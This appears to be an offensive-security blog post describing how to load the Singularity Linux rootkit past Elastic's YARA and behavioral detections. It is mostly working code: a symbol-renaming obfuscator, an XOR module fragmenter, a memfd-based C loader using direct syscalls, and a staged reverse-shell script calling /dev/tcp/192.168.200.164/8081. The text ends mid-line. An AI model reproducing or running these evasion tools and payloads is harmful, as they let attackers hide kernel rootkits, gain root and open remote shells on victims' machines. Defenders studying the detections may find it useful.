Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 